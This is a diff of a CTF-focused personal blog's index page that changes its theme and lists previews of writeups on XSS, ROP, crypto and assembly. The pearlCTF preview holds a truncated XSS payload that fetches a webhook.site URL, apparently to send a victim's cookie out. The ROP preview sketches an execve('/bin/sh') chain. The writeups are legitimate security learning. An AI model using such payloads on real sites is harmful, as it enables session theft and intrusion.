@@ -1,603 +1,943 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="utf-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-<meta name="viewport" content="width=device-width, initial-scale=1"/>
 
-<!--Description-->
+  <!DOCTYPE html>
+  <html lang="en"  >
+  <head>
+  <meta charset="utf-8">
+  
 
+  
 
+  
 
-
-<!--Author-->
-
-    <meta name="author" content="Naup堇姬"/>
-
-
-<!--Open Graph Title-->
-
-    <meta property="og:title" content="堇姬 Naup&#39;s Blog"/>
-
-
-<!--Open Graph Description-->
-
-
-<!--Open Graph Site Name-->
-    <meta property="og:site_name" content="堇姬 Naup&#39;s Blog"/>
-
-<!--Type page-->
-
-    <meta property="og:type" content="website"/>
-
-
-<!--Page Cover-->
-
-
-    <meta property="og:image" content="http://example.com/img/bg4.jpg"/>
-
-
-<meta name="twitter:card" content="summary_large_image"/>
-
-
-
-
-    <meta name="twitter:image" content="http://example.com/img/bg4.jpg"/>
-
-
-<!-- Title -->
-
-<title>堇姬 Naup&#39;s Blog</title>
-
-<!-- Bootstrap Core CSS -->
-<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
-
-<!-- Custom CSS -->
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<!-- Custom Fonts -->
-<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
-<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
-<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
-<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
-<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
-
-<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
-<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
-<!--[if lt IE 9]>
-<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
-<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
-<![endif]-->
-
-<!-- Gallery -->
-<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
-<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">
-
-<!-- favicon -->
-
-<link rel="icon" href="/img/icon.jpg"/>
-
-
-
-    <!-- Google Analytics -->
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
     
+    堇姬 Naup&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
 
+  
+  
+    <meta property="og:type" content="website">
+<meta property="og:title" content="堇姬 Naup&#39;s Blog">
+<meta property="og:url" content="http://example.com/page/5/index.html">
+<meta property="og:site_name" content="堇姬 Naup&#39;s Blog">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/banner.webp">
+<meta property="article:author" content="Naup堇姬">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/banner.webp">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="堇姬 Naup's Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/fav.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
 
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
 <!-- hexo injector head_end start -->
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
 <!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
-<!-- Head tag -->
 
-<body>
-
-    <!-- Menu -->
-    <!-- Navigation -->
-<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
-    <div class="container pl-0 pr-0">
-        <!-- Brand and toggle get grouped for better mobile display -->
-        <div class="navbar-header page-scroll">
-            <a class="navbar-brand text-white p-1 pl-3" href="/">堇姬 Naup's Blog</a>
-        </div>
-        <div class="navbar-nav float-right">
-            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
-                <i class="fas fa-search"></i>
-            </button>
-        </div>
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
     </div>
-    <!-- /.container -->
-</nav>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
 
-    <!-- Main Content -->
-    <!-- Page Header -->
-<!-- Set your background image for this header in the theme's configuration: index_cover -->
-<header class="intro-header" style="background-image: url('/img/bg4.jpg')">
-    <div class="container">
-        <div class="row">
-            <div class="col-lg-8 offset-md-2 col-md-10 offset-md-1">
-                <div class="site-heading text-center text-white">
-                    <h1>堇姬 Naup's Blog</h1>
-                    <hr class="small">
-                    <span class="subheading d-block">Web x Crypto x Pwn</span>
-                </div>
-            </div>
-        </div>
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">Home</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">Archives</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">About</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">堇姬 Naup&#39;s Blog</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+            <a href="/" id="subtitle">Web x Crypto x Pwn</a>
+          
+        </h2>
+      
     </div>
+  </div>
 </header>
 
-<!-- Main Content -->
-<div class="container page-index">
-    <div class="row">
-        <div class="col-lg-8 offset-md-2 col-md-10 offset-md-1">
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        </div>
-        <div class="col-lg-8 offset-md-2 col-md-10 offset-md-1 post-all">    
-            
-                
-                    <div class="post-preview post-preview-index">
-    <a href="/2024/05/05/THJCC-office-Writeup/">
-        <h2 class="post-title">
-            THJCC-official-Writeup
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2024-05-05
-    </p>
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper ">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
+  <div class="sidebar-author-name">Naup堇姬</div>
+  <div class="sidebar-description"></div>
 </div>
-<hr>
-                
-            
-                
-                    <div class="post-preview post-preview-index">
-    <a href="/2024/04/27/Intigriti-August-XSS-challenge/">
-        <h2 class="post-title">
-            Intigriti-August-XSS-challenge
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2024-04-27
-    </p>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">55</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
 </div>
-<hr>
-                
-            
-                
-                    <div class="post-preview post-preview-index">
-    <a href="/2024/04/25/Assembly-x86/">
-        <h2 class="post-title">
-            Assembly-x86
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2024-04-25
-    </p>
-</div>
-<hr>
-                
-            
-                
-                    <div class="post-preview post-preview-index">
-    <a href="/2024/04/25/ROP-chall-1/">
-        <h2 class="post-title">
-            ROP-chall-1
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2024-04-25
-    </p>
-</div>
-<hr>
-                
-            
-                
-                    <div class="post-preview post-preview-index">
-    <a href="/2024/03/31/MATH-Lucas-Sequence/">
-        <h2 class="post-title">
-            Lucas-Sequence
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2024-03-31
-    </p>
-</div>
-<hr>
-                
-            
-                
-                    <div class="post-preview post-preview-index">
-    <a href="/2024/03/30/VishwaCTF-2024-WP/">
-        <h2 class="post-title">
-            VishwaCTF-2024-Writeup
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2024-03-30
-    </p>
-</div>
-<hr>
-                
-            
-                
-                    <div class="post-preview post-preview-index">
-    <a href="/2024/03/10/AIS3-EOF-2024-Final/">
-        <h2 class="post-title">
-            AIS3-EOF-2024-Final
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2024-03-10
-    </p>
-</div>
-<hr>
-                
-            
-                
-                    <div class="post-preview post-preview-index">
-    <a href="/2024/03/10/pearlCTF-2024-WP/">
-        <h2 class="post-title">
-            pearlCTF-2024-WP
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2024-03-10
-    </p>
-</div>
-<hr>
-                
-            
-                
-                    <div class="post-preview post-preview-index">
-    <a href="/2024/02/29/QuantumCTF-CLASS/">
-        <h2 class="post-title">
-            量子密碼學(QuantumCTF初探與解題)
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2024-02-29
-    </p>
-</div>
-<hr>
-                
-            
-                
-                    <div class="post-preview post-preview-index">
-    <a href="/2024/02/29/AIS3-EOF-2024-Qual-WP/">
-        <h2 class="post-title">
-            AIS3 EOF 2024 Qual Writeup
-        </h2>
-        
-    </a>
-    <p class="post-meta">
-        <!-- Date and Author -->
-        
-        2024-02-29
-    </p>
-</div>
-<hr>
-                
-            
-        </div>
-        <div class="col-lg-8 offset-md-2 col-md-10 offset-md-1 post-all">    
-            <ul class="pagination d-block text-center">
-    
-        <li class="previous page-item d-inline"><a href="/page/4/" class="page-link float-left">&larr;  Newer</a></li>
-    
-    
-        <li class="next page-item d-inline"><a href="/page/6/" class="page-link float-right">Older  &rarr;</a></li>
-    
-</ul>
-        </div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
     </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+  
 </div>
 
-
-
-    <!-- Footer -->
-    <hr />
-
-<!-- Footer -->
-<footer id="footer">
-    <div class="container">
-        <div class="row">
-            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
-                <ul class="list-inline">
-                    
-
-                    
-
-                    
-                        <li class="list-inline-item">
-                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
-                                <span class="fa-stack fa-lg">
-                                    <i class="fa fa-circle fa-stack-2x"></i>
-                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
-                                </span>
-                            </a>
-                        </li>
-                    
-
-                    
-
-                    
-                        <li class="list-inline-item">
-                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
-                                <span class="fa-stack fa-lg">
-                                    <i class="fa fa-circle fa-stack-2x"></i>
-                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
-                                </span>
-                            </a>
-                        </li>
-                    
-
-                    
-                </ul>
-                <ul class="copyright footer-menu list-inline">
-                    
-                    
-                        <li class="list-inline-item">
-                            
-                            
-                            <a href="/">
-                                
-                                    Home
-                                
-                            </a>
-                        </li>
-                    
-                        <li class="list-inline-item">
-                            
-                                <span class="copyright-split">&nbsp;|&nbsp;</span>
-                            
-                            
-                            <a href="/archives">
-                                
-                                    Archives
-                                
-                            </a>
-                        </li>
-                    
-                        <li class="list-inline-item">
-                            
-                                <span class="copyright-split">&nbsp;|&nbsp;</span>
-                            
-                            
-                            <a href="/tags">
-                                
-                                    Tags
-                                
-                            </a>
-                        </li>
-                    
-                        <li class="list-inline-item">
-                            
-                                <span class="copyright-split">&nbsp;|&nbsp;</span>
-                            
-                            
-                            <a href="/categories">
-                                
-                                    Categories
-                                
-                            </a>
-                        </li>
-                    
-                        <li class="list-inline-item">
-                            
-                                <span class="copyright-split">&nbsp;|&nbsp;</span>
-                            
-                            
-                            <a href="/about">
-                                
-                                    About
-                                
-                            </a>
-                        </li>
-                    
-                </ul>
-                <p class="copyright footer-author">
-                    &copy; -2025 
-                    <a rel="external" class="copyright-link" href="" target="_blank">Naup堇姬</a><br/>
-                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
-                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
-                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
-                    
-                    
-                </p>
-            </div>
-        </div>
+      
+      
     </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main">
+  
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2024/05/05/THJCC-office-Writeup/" aria-label="THJCC-official-Writeup"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        
+        
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="THJCC-official-Writeup" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2024-05-05</span>
+        <span><span class="icon-pencil"></span>1.8k words</span>
+        <span><span class="icon-clock"></span>8 mins</span>
+      </div>
+      <h2 class="post-title">THJCC-official-Writeup</h2>
+      <article class="post-article">
+        
+          THJCC CTF official writeup
+Author:堇姬Naup
+
+Source Code : https://github.com/Naupjjin/THJCC-CTF-source-code
+CryptoJPG^PNG&amp;#x3D;?source1234567891011121314from itertools import cycledef xor(a, b):    return [i^j for i, j in zip(a, cycle(b))]KEY= open(&amp;quot;key.png&amp;quot;, &amp;quot;rb&amp;quot;).read()FLAG = ope
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2024/04/27/Intigriti-August-XSS-challenge/" aria-label="Intigriti-August-XSS-challenge"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        
+        
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="Intigriti-August-XSS-challenge" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2024-04-27</span>
+        <span><span class="icon-pencil"></span>2.6k words</span>
+        <span><span class="icon-clock"></span>14 mins</span>
+      </div>
+      <h2 class="post-title">Intigriti-August-XSS-challenge</h2>
+      <article class="post-article">
+        
+          Intigriti’s August XSS challenge
+Author:堇姬Naup
+
+題目https://challenge-0823.intigriti.io/有一個計算機可以輸入東西，只要有執行alert(document.domain)就可以過了image
+Source code12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2024/04/25/Assembly-x86/" aria-label="Assembly-x86"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        
+        
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="Assembly-x86" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2024-04-25</span>
+        <span><span class="icon-pencil"></span>483 words</span>
+        <span><span class="icon-clock"></span>2 mins</span>
+      </div>
+      <h2 class="post-title">Assembly-x86</h2>
+      <article class="post-article">
+        
+          組合語言
+Author:堇姬
+
+電腦底層架構與程式執行相關硬體
+CPU
+
+實際運算硬體，配有暫存器，儲存運算資料
+
+RAM
+
+記憶體
+指令集架構先設計好指令集架構再設計電路。
+常見:
+
+x86&amp;#x2F;x86-64
+ARM
+MIPS
+
+大部分用的是intel x86&amp;#x2F;x86-64架構
+CPU暫存器隨設計而改變用途
+
+
+
+
+名稱
+意思
+
+
+
+rax
+accumulator
+
+
+rbx
+base
+
+
+rcx
+count
+
+
+rdx
+data
+
+
+固定用途
+
+
+
+
+名稱
+意思
+
+
+
+rsi
+source index
+
+
+rdi
+destination index
+
+
+rbp
+base p
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2024/04/25/ROP-chall-1/" aria-label="ROP-chall-1"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        
+        
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="ROP-chall-1" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2024-04-25</span>
+        <span><span class="icon-pencil"></span>311 words</span>
+        <span><span class="icon-clock"></span>1 min</span>
+      </div>
+      <h2 class="post-title">ROP-chall-1</h2>
+      <article class="post-article">
+        
+          ROP-chall
+Author:堇姬
+
+題目來源ICED的pwn題目https://ctf.nicewhite.xyz/
+確認保護image看到有開Stack canary，但溢出後卻沒有報stack canary的錯誤，所以應該是沒開。另外他有開NX，所以沒辦法寫shellcodeimage
+分析ASMimage有gets 可以BOF，不過沒有其他function可以return過去，所以應該是要ROP
+堆ROP
+execve(‘bin&amp;#x2F;sh’)
+
+
+
+
+
+暫存器
+值
+
+
+
+rax
+0x3b
+
+
+rdi
+要執行的參數值(&amp;#x2F;bin&amp;#x2F;sh)
+
+
+rsi
+argv(
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2024/03/31/MATH-Lucas-Sequence/" aria-label="Lucas-Sequence"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        
+        
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="Lucas-Sequence" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2024-03-31</span>
+        <span><span class="icon-pencil"></span>28 words</span>
+        <span><span class="icon-clock"></span>1 min</span>
+      </div>
+      <h2 class="post-title">Lucas-Sequence</h2>
+      <article class="post-article">
+        
+          Lucas Sequence 盧卡斯數列
+Author:堇姬
+
+先看這個連結(還在處理LaTeX問題QQ)https://hackmd.io/@naup96321/B1Y7vqUyC
+
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2024/03/30/VishwaCTF-2024-WP/" aria-label="VishwaCTF-2024-Writeup"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        
+        
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="VishwaCTF-2024-Writeup" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2024-03-30</span>
+        <span><span class="icon-pencil"></span>4.6k words</span>
+        <span><span class="icon-clock"></span>25 mins</span>
+      </div>
+      <h2 class="post-title">VishwaCTF-2024-Writeup</h2>
+      <article class="post-article">
+        
+          VishwaCTF 2024 writeup
+Team: CakeisTheFake(單人)Rank: 31&amp;#x2F;1039Author: Naup堇姬
+
+MiscWho am I?image
+WebSave The City1234567DESCRIPTIONThe RAW Has Got An Input That ISIS Has Planted a Bomb Somewhere In The Pune! Fortunetly, RAW Has Infiltratrated The Internet Activity of One Suspect And They Found Thi
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2024/03/10/AIS3-EOF-2024-Final/" aria-label="AIS3-EOF-2024-Final"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        
+        
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="AIS3-EOF-2024-Final" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2024-03-10</span>
+        <span><span class="icon-pencil"></span>1.2k words</span>
+        <span><span class="icon-clock"></span>4 mins</span>
+      </div>
+      <h2 class="post-title">AIS3-EOF-2024-Final</h2>
+      <article class="post-article">
+        
+          
+Author : 堇姬NaupTeam : 不屬於Kirito的星爆氣流斬Rank : 4 (差一點第三，可惜)Teammates : Curious、Itiscaleb、Aukro、ShallowFeather、Chumy、TWNWAKing、Vincent(感恩隊友們一起努力了兩天orz)
+
+Final scoreboard
+
+賽制這次總共有163 round，每round是五分鐘，用積分去以百分比的方式去算分，這次總共有三種不同的類型。
+Attack &amp;amp; Defense
+hahamut
+casino
+
+KoH
+rush-p0pp3r
+
+123456789101112131415
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2024/03/10/pearlCTF-2024-WP/" aria-label="pearlCTF-2024-WP"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        
+        
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="pearlCTF-2024-WP" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2024-03-10</span>
+        <span><span class="icon-pencil"></span>3.4k words</span>
+        <span><span class="icon-clock"></span>19 mins</span>
+      </div>
+      <h2 class="post-title">pearlCTF-2024-WP</h2>
+      <article class="post-article">
+        
+          Pearl CTF 2024- CakeisTheFake - Writeupimage
+
+Team : CakeisTheFakeRank : 16&amp;#x2F;605
+
+Weblearn HTTP題目是一個web service，會把使用者丟進去的get參數在後端處理後變封包丟出來：image然後有個/flag的路徑會去驗證你的cookie，是的話才可以拿到flag。標準的XSS：payload 
+123HTTP/1.1 200 OK&amp;lt;script&amp;gt;fetch(&amp;quot;http://webhook.site/c9e321c1-b9d5-4b55-9d10-f1feec26a1
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2024/02/29/QuantumCTF-CLASS/" aria-label="量子密碼學(QuantumCTF初探與解題)"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        
+        
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="量子密碼學(QuantumCTF初探與解題)" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2024-02-29</span>
+        <span><span class="icon-pencil"></span>6k words</span>
+        <span><span class="icon-clock"></span>36 mins</span>
+      </div>
+      <h2 class="post-title">量子密碼學(QuantumCTF初探與解題)</h2>
+      <article class="post-article">
+        
+          
+Author:堇姬Naup
+
+共筆https://hackmd.io/@3C-Tim/HJLfSR_t6/edit
+題目writeup(註解打得很詳細了，我就不多說了)AIS3前測12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import randomfrom math import sqrt#將binary string轉成十進制的functiondef BinaryToDecimal(b
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2024/02/29/AIS3-EOF-2024-Qual-WP/" aria-label="AIS3 EOF 2024 Qual Writeup"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        
+        
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="AIS3 EOF 2024 Qual Writeup" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2024-02-29</span>
+        <span><span class="icon-pencil"></span>2.9k words</span>
+        <span><span class="icon-clock"></span>15 mins</span>
+      </div>
